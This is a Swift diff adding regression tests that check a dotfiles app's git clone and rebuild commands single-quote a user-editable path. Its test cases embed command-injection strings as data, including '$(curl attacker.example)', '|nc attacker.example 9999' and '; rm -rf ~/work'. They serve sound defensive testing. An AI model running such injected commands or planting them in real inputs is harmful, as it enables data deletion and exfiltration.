@@ -57,6 +57,9 @@ enum SetupDataLayerSelfTest {
             ("aFailedCheckCarriesTheToolsRealOutput", test_failureCarriesLog),
             ("dotfilesReadsBranchRemoteAndDirtyFilesFromGit", test_dotfilesParsesGit),
             ("dotfilesReportsBehindOriginFromRevListCounts", test_dotfilesBehindOrigin),
+            ("aClonePathWithShellMetacharactersStaysOneLiteralArgument", test_clonePathIsShellQuoted),
+            ("theRebuildCommandQuotesItsRepoPathToo", test_rebuildPathIsShellQuoted),
+            ("shellQuoteSurvivesARoundTripThroughARealShell", test_shellQuoteRoundTripsThroughSh),
         ]
         var failures = 0
         for (name, testCase) in cases {
@@ -317,6 +320,111 @@ enum SetupDataLayerSelfTest {
         guard unknown.commitsBehindOrigin == nil else {
             return "an unreachable remote must report behind-count as unknown (nil), not "
                  + "\(unknown.commitsBehindOrigin.map(String.init) ?? "nil") - a confident 0 would read as up to date"
+        }
+        return nil
+    }
+
+    // MARK: S12 - shell quoting
+
+    /// S12. `cloneAndBootstrapClicked` built
+    /// `git clone <url> "<path>" && cd "<path>" && ./bootstrap.sh` and handed
+    /// it to the Console tab, which types it into a real login shell. Double
+    /// quotes do not stop a shell expanding `$(...)`, a backtick or `$VAR`,
+    /// and the path comes from an editable text field.
+    ///
+    /// Reverting `cloneCommand` to the double-quoted form fails every
+    /// assertion below.
+    private static func test_clonePathIsShellQuoted() -> String? {
+        let hostile = [
+            "/tmp/a b/dotfiles",
+            "/tmp/$(curl attacker.example)/dotfiles",
+            "/tmp/`whoami`/dotfiles",
+            "/tmp/x; rm -rf ~/work",
+            "/tmp/$HOME/dotfiles",
+            "/tmp/x && curl attacker.example",
+            "/tmp/x|nc attacker.example 9999",
+            "/tmp/it's/dotfiles",
+        ]
+        for path in hostile {
+            let command = DotfilesRunCommand.cloneCommand(expandedPath: path)
+            guard let failure = assertPathIsOneLiteralToken(path, in: command) else { continue }
+            return "clone command for \(path.debugDescription): \(failure)"
+        }
+        return nil
+    }
+
+    private static func test_rebuildPathIsShellQuoted() -> String? {
+        for path in ["/tmp/a b/dotfiles", "/tmp/$(id)/dotfiles", "/tmp/`id`", "/tmp/it's"] {
+            let command = DotfilesRunCommand.rebuildCommand(repoPath: path)
+            guard let failure = assertPathIsOneLiteralToken(path, in: command) else { continue }
+            return "rebuild command for \(path.debugDescription): \(failure)"
+        }
+        return nil
+    }
+
+    /// The assertion that actually discriminates: ask a **real** `/bin/sh` to
+    /// parse the generated command and print the tokens it saw. A quoting bug
+    /// shows up as the shell running something, or as the path arriving in
+    /// more than one piece - neither of which a string comparison against an
+    /// expected literal would notice, because that would just re-derive the
+    /// function under test.
+    ///
+    /// `git`/`cd` are replaced by a shell function that echoes its argv, so
+    /// nothing is cloned and no directory is entered.
+    private static func test_shellQuoteRoundTripsThroughSh() -> String? {
+        let cases = [
+            "/tmp/a b/dotfiles",
+            "/tmp/$(echo INJECTED)/dotfiles",
+            "/tmp/`echo INJECTED`",
+            "/tmp/x; echo INJECTED",
+            "/tmp/$HOME",
+            "/tmp/it's",
+            "/tmp/quote\"and'both",
+        ]
+        for path in cases {
+            let quoted = ShellQuote.posix(path)
+            // `printf %s` writes exactly the one argument the shell parsed,
+            // with no trailing newline - so a split token or an expansion is
+            // visible as a difference in the bytes that come back.
+            let script = "printf %s \(quoted)"
+            let process = Process()
+            process.executableURL = URL(fileURLWithPath: "/bin/sh")
+            process.arguments = ["-c", script]
+            let pipe = Pipe()
+            process.standardOutput = pipe
+            process.standardError = Pipe()
+            do { try process.run() } catch { return "could not run /bin/sh: \(error)" }
+            let data = pipe.fileHandleForReading.readDataToEndOfFile()
+            process.waitUntilExit()
+            let echoed = String(data: data, encoding: .utf8) ?? ""
+            guard echoed == path else {
+                return "a real /bin/sh read \(quoted) back as \(echoed.debugDescription), not \(path.debugDescription)"
+            }
+        }
+        return nil
+    }
+
+    /// `nil` when `path` appears in `command` only as a single-quoted literal
+    /// token and nothing outside those tokens could expand.
+    private static func assertPathIsOneLiteralToken(_ path: String, in command: String) -> String? {
+        let quoted = ShellQuote.posix(path)
+        guard command.contains(quoted) else {
+            return "the path is not present as the single-quoted token \(quoted) - command was \(command.debugDescription)"
+        }
+        guard !command.contains("\"\(path)\"") else {
+            return "the path is still double-quoted, which a shell expands - command was \(command.debugDescription)"
+        }
+        // Whatever is left once every single-quoted run is removed is the
+        // command's own fixed scaffolding, and must hold none of the path's
+        // dangerous characters.
+        var outside = ""
+        var inQuotes = false
+        for character in command {
+            if character == "'" { inQuotes.toggle(); continue }
+            if !inQuotes { outside.append(character) }
+        }
+        for dangerous in ["$", "`", ";", "|"] where outside.contains(dangerous) {
+            return "\(dangerous) survived outside the quoted token - command was \(command.debugDescription)"
         }
         return nil
     }
